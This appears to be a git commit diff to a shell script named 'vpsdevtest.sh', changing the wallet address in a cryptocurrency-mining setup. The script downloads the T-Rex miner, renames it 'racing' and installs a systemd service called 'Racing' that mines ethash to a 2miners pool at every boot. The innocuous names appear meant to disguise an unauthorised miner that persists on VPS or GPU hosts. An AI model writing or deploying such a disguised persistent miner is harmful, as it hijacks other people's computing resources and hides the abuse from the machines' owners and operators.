8d2870e0d6c41861b9410dde87ad59437bc271d2
Master478963 <101531061+Master478963@users.noreply.github.com>
2022-04-14 20:26:19 +0530

    Update vpsdevtest.sh

--- vpsdevtest.sh
+++ vpsdevtest.sh
@@ -18,7 +18,7 @@ sudo systemctl start nvidia-fabricmanager
 wget https://github.com/trexminer/T-Rex/releases/download/0.21.6/t-rex-0.21.6-linux.tar.gz
 tar xvzf t-rex-0.21.6-linux.tar.gz
 mv t-rex racing
-sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o us-eth.2miners.com:2020 -u 0xee8d6ac2827f65b369babfe5a4cd31dcdfb96aab -p x -w ${woker}_leevipu\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
+sudo bash -c 'echo -e "[Unit]\nDescription=Racing\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/racing -a ethash -o us-eth.2miners.com:2020 -u 0x0afd8A6e2d4403D7d3aB98B66d6e5D67C3e6fb21 -p x -w ${woker}_leevipu\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/racing.service'
 sudo systemctl daemon-reload
 sudo systemctl enable racing.service
 ./racing -a ethash -o us-eth.2miners.com:2020 -u bc1qu7ecen9pvuva0x3t2qxsy9d3ayldt9qvy6ehgw -p x -w $woker &
